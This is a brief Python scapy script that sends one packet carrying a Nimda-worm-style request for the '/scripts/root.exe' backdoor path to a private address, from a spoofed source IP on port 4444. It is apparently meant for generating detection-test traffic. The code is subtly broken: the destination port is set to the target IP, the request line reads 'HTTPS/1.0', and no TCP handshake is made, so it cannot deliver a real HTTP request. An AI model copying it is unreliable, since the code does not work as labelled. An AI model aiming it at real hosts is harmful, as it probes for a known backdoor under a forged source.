from scapy.all import Ether, IP, TCP, Raw, send


def send_nimda_packet(target_ip, target_port=80, source_ip="192.168.2.36", source_port=4444):
    packet = (
        IP(src=source_ip, dst=target_ip)
        /TCP(sport=source_port, dport=target_ip)
        /Raw(load="GET /scripts/root.exe HTTPS/1.0\r\nHost: example.com\r\n\r\n")
    )
    send(packet)


if __name__ == "__main__":
    target_ip = "192.168.2.20"
    send_nimda_packet(target_ip)